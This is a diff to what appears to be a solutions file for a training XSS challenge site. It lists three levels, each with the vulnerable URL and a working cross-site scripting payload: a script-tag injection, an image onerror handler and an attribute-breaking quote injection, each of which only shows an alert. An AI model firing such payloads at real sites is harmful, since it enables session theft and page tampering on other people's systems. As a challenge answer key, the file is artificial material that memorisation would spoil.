@@ -1,3 +1,11 @@
- Level 1: Hello, world of XSS
- Vulnerability: https://xss-game.appspot.com/level1/frame?query=
- Payload: <script>alert(1)</script>
+[1/6] Level 1: Hello, world of XSS
+Vulnerability: https://xss-game.appspot.com/level1/frame?query=
+Payload: <script>alert(document.location)</script>
+
+[2/6] Level 2: Persistence is key
+Vulnerability: https://xss-game.appspot.com/level2/frame
+Payload: <img src/onerror=alert(document.location)>
+
+[3/6] Level 3: That sinking feeling...
+Vulnerability: https://xss-game.appspot.com/level3/frame#1
+Payload: '><script>alert(document.location)</script>
